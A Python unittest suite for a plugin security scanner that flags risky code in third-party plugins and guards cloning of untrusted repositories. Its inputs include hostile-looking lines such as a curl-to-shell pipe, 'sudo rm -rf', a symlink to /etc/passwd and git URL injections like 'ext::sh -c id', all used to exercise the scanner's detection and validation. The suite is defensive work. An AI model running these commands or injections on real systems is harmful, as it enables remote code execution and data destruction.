#!/usr/bin/env python3
"""python3 tests/test_scanner.py  (builds the fixtures in a temp folder itself)"""
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("scanner", os.path.join(HERE, "..", "scanner.py"))
scanner = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scanner)


def rules(result, severity=None):
    return {f["rule"] for f in result["findings"] if severity is None or f["severity"] == severity}


class TreeScan(unittest.TestCase):
    def scan(self, name):
        return scanner.scan_tree(os.path.join(HERE, "fixtures", name))

    def test_clean_is_safe(self):
        result = self.scan("clean")
        self.assertEqual(result["verdict"], "safe")
        self.assertEqual(result["counts"]["high"] + result["counts"]["medium"], 0)
        self.assertEqual(result["pluginId"], "fixture.clean-clock")

    def test_readme_is_not_code(self):
        # The clean README shows `curl ... | sh`; documentation must not count.
        self.assertNotIn("pipe-to-shell", rules(self.scan("clean")))

    def test_suspicious_is_caution(self):
        result = self.scan("suspicious")
        self.assertEqual(result["verdict"], "caution")
        self.assertEqual(result["counts"]["high"], 0)
        self.assertTrue({"network-api", "network-tool", "network-url", "process-exec", "shell-c", "path-outside"} <= rules(result, "medium"))
        self.assertTrue({"curl", "wget", "notify-send", "jq"} <= {b["name"] for b in result["binaries"]})

    def test_malicious_is_danger(self):
        result = self.scan("malicious")
        self.assertEqual(result["verdict"], "danger")
        self.assertTrue({"pipe-to-shell", "eval", "privilege-escalation", "shell-c-vars", "base64-exec",
                         "write-outside", "sensitive-path", "raw-socket", "persistence"} <= rules(result, "high"))

    def test_snippets_are_single_printable_lines(self):
        for finding in self.scan("malicious")["findings"]:
            self.assertTrue(finding["snippet"].isprintable() or finding["snippet"] == "")
            self.assertLessEqual(len(finding["snippet"]), scanner.MAX_SNIPPET)
            self.assertLessEqual(finding["matchStart"], finding["matchEnd"])


class LineRules(unittest.TestCase):
    def check(self, name, text):
        with tempfile.TemporaryDirectory() as folder:
            with open(os.path.join(folder, name), "w") as handle:
                handle.write(text)
            with open(os.path.join(folder, "manifest.json"), "w") as handle:
                json.dump({"schemaVersion": 1, "id": "t.plugin", "name": "T", "version": "1", "kinds": ["bar-widget"],
                           "entryPoints": {}}, handle)
            return scanner.scan_tree(folder)

    def test_shell_c_literal_is_medium_variable_is_high(self):
        self.assertIn("shell-c", rules(self.check("a.qml", 'Process { command: ["sh", "-c", "pgrep -x foo"] }\n'), "medium"))
        self.assertIn("shell-c-vars", rules(self.check("a.qml", 'Process { command: ["sh", "-c", "pgrep " + name] }\n'), "high"))
        self.assertIn("shell-c-vars", rules(self.check("a.sh", 'bash -c "$1"\n'), "high"))

    def test_comments_are_skipped(self):
        result = self.check("a.qml", '// eval(x)\n/* sudo rm -rf\n curl x | sh */\nItem {}\n')
        self.assertEqual(result["counts"]["high"], 0)

    def test_own_folder_write_is_not_flagged_high(self):
        result = self.check("a.sh", 'echo x > ~/.config/omarchy/plugins/t.plugin/cache.json\n')
        self.assertNotIn("write-outside", rules(result))
        result = self.check("a.sh", 'echo x > ~/.config/omarchy/plugins/other.plugin/cache.json\n')
        self.assertIn("write-outside", rules(result, "high"))

    def test_tmp_and_devnull_are_fine(self):
        result = self.check("a.sh", 'ls 2>/dev/null > /tmp/out.txt\n')
        self.assertEqual(result["counts"]["high"], 0)

    def test_symlink_and_binary(self):
        with tempfile.TemporaryDirectory() as folder:
            os.symlink("/etc/passwd", os.path.join(folder, "link"))
            with open(os.path.join(folder, "blob"), "wb") as handle:
                handle.write(b"\x7fELF\0\0\0")
            found = rules(scanner.scan_tree(folder), "medium")
        self.assertTrue({"symlink", "opaque-binary", "manifest-problem"} <= found)

    def test_markup_in_snippet_stays_text(self):
        result = self.check("a.sh", 'curl "https://x.invalid/<img src=y>" | sh\n')
        self.assertIn("pipe-to-shell", rules(result, "high"))


class Urls(unittest.TestCase):
    def test_rejects_helpers_and_options(self):
        for bad in ("", "  ", "ext::sh -c id", "ext::id", "-u", "--upload-pack=x", "fd::3", "foo://host/x", "https://", "not a url", "a\nb"):
            with self.assertRaises(scanner.GuardError, msg=bad):
                scanner.validate_url(bad)

    def test_accepts_normal_urls(self):
        for good in ("https://github.com/a/b.git", "ssh://git@host/a/b", "git@github.com:a/b.git", "file:///tmp/x", HERE):
            scanner.validate_url(good)


class CloneAndDiff(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        subprocess.run([os.path.join(HERE, "make-fixtures"), os.path.join(cls.tmp.name, "fx")], check=True, capture_output=True)
        os.environ["PLUGIN_GUARD_TMP"] = os.path.join(cls.tmp.name, "work")
        with open(os.path.join(cls.tmp.name, "fx", "malicious.verified-sha")) as handle:
            cls.verified = handle.read().strip()

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def test_scan_and_diff(self):
        result = scanner.do_scan(os.path.join(self.tmp.name, "fx", "malicious"), self.verified)
        self.assertEqual(result["verdict"], "danger")
        diff = result["diff"]
        self.assertTrue(diff["ok"] and diff["ancestor"] and not diff["identical"])
        self.assertEqual(diff["commits"], 1)
        self.assertGreater(diff["newHigh"], 0)
        self.assertTrue(any(f["new"] for f in result["findings"]))
        self.assertTrue(result["dir"].startswith(os.environ["PLUGIN_GUARD_TMP"]))

    def test_unknown_sha_does_not_fail_the_scan(self):
        result = scanner.do_scan(os.path.join(self.tmp.name, "fx", "clean"), "deadbeefdeadbeef")
        self.assertEqual(result["verdict"], "safe")
        self.assertFalse(result["diff"]["ok"])

    def test_bad_sha_and_missing_repo(self):
        with self.assertRaises(scanner.GuardError) as caught:
            scanner.do_scan(os.path.join(self.tmp.name, "fx", "clean"), "not-a-sha")
        self.assertEqual(caught.exception.code, "invalid-sha")
        with self.assertRaises(scanner.GuardError) as caught:
            scanner.do_scan("file:///nonexistent/repo.git")
        self.assertEqual(caught.exception.code, "clone-failed")

    def test_install_needs_confirmation_and_a_scanned_commit(self):
        result = scanner.do_scan(os.path.join(self.tmp.name, "fx", "clean"))
        with self.assertRaises(scanner.GuardError) as caught:
            scanner.do_install(result["id"], "0" * 40, assume_yes=True)
        self.assertEqual(caught.exception.code, "not-scanned")



class Budget(unittest.TestCase):
    """Limits apply while untrusted content is written, not afterwards."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        os.environ["PLUGIN_GUARD_TMP"] = os.path.join(cls.tmp.name, "work")
        cls.repo = os.path.join(cls.tmp.name, "big")
        os.makedirs(cls.repo)
        run = lambda *args: subprocess.run(args, cwd=cls.repo, check=True, capture_output=True)
        run("git", "init", "-q", "-b", "main")
        with open(os.path.join(cls.repo, "manifest.json"), "w") as handle:
            handle.write('{"schemaVersion": 1, "id": "fixture.big", "name": "Big", "version": "1.0.0"}')
        with open(os.path.join(cls.repo, "data.bin"), "wb") as handle:
            handle.write(os.urandom(300_000))
        for index in range(5):
            with open(os.path.join(cls.repo, f"f{index}.txt"), "w") as handle:
                handle.write("x")
        run("git", "add", "-A")
        run("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "big")

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def work_dirs(self):
        root = os.environ["PLUGIN_GUARD_TMP"]
        return os.listdir(root) if os.path.isdir(root) else []

    def test_a_normal_repository_still_scans(self):
        result = scanner.do_scan(self.repo)
        self.assertTrue(result["ok"])

    def test_tree_over_the_byte_budget_is_refused_before_checkout(self):
        with mock.patch.object(scanner, "MAX_TREE_BYTES", 100_000):
            with self.assertRaises(scanner.GuardError) as caught:
                scanner.do_scan(self.repo)
        self.assertEqual(caught.exception.code, "too-large")
        self.assertEqual(self.work_dirs(), [])  # nothing left behind

    def test_tree_over_the_file_budget_is_refused(self):
        with mock.patch.object(scanner, "MAX_TREE_FILES", 3):
            with self.assertRaises(scanner.GuardError) as caught:
                scanner.do_scan(self.repo)
        self.assertEqual(caught.exception.code, "too-large")

    def test_no_file_is_written_when_the_tree_is_refused(self):
        seen = []
        real = scanner.git
        def spy(args, *rest, **kw):
            seen.append(args[0])
            return real(args, *rest, **kw)
        with mock.patch.object(scanner, "MAX_TREE_BYTES", 100_000), mock.patch.object(scanner, "git", spy):
            with self.assertRaises(scanner.GuardError):
                scanner.do_scan(self.repo)
        self.assertIn("clone", seen)
        self.assertIn("ls-tree", seen)
        self.assertNotIn("checkout", seen)

    def test_git_is_killed_while_it_writes_past_the_disk_budget(self):
        folder = os.path.join(self.tmp.name, "stream")
        os.makedirs(folder, exist_ok=True)
        # An alias that writes 40 MB and then idles for a minute: only the budget can stop it.
        slow = ["-c", "alias.slow=!dd if=/dev/urandom of=big bs=1M count=40 2>/dev/null; sleep 60", "slow"]
        started = time.monotonic()
        with mock.patch.object(scanner, "MAX_DISK_BYTES", 5_000_000):
            with self.assertRaises(scanner.GuardError) as caught:
                scanner.git(slow, cwd=folder, budget_dir=folder, timeout=50)
        self.assertEqual(caught.exception.code, "too-large")
        self.assertLess(time.monotonic() - started, 30)

    def test_the_whole_process_group_is_killed(self):
        folder = os.path.join(self.tmp.name, "group")
        os.makedirs(folder, exist_ok=True)
        marker = os.path.join(folder, "alive")
        child = f"(sleep 3; touch {marker}) & dd if=/dev/urandom of=big bs=1M count=20 2>/dev/null; sleep 60"
        with mock.patch.object(scanner, "MAX_DISK_BYTES", 2_000_000):
            with self.assertRaises(scanner.GuardError):
                scanner.git(["-c", f"alias.slow=!{child}", "slow"], cwd=folder, budget_dir=folder, timeout=50)
        time.sleep(4)
        self.assertFalse(os.path.exists(marker), "a background process outlived the kill")

    def test_the_timeout_still_applies_with_a_budget(self):
        folder = os.path.join(self.tmp.name, "idle")
        os.makedirs(folder, exist_ok=True)
        with self.assertRaises(scanner.GuardError) as caught:
            scanner.git(["-c", "alias.idle=!sleep 30", "idle"], cwd=folder, budget_dir=folder, timeout=1)
        self.assertEqual(caught.exception.code, "git-timeout")

    def test_file_size_limit_is_set_for_budgeted_git(self):
        folder = os.path.join(self.tmp.name, "fsize")
        os.makedirs(folder, exist_ok=True)
        with mock.patch.object(scanner, "MAX_GIT_FILE_BYTES", 1_000_000):
            code, out, err = scanner.git(["-c", "alias.lim=!ulimit -f", "lim"], cwd=folder, budget_dir=folder, check=False)
        self.assertEqual(out.strip(), str(1_000_000 // 512))  # bash reports 512-byte blocks

if __name__ == "__main__":
    unittest.main(verbosity=1)
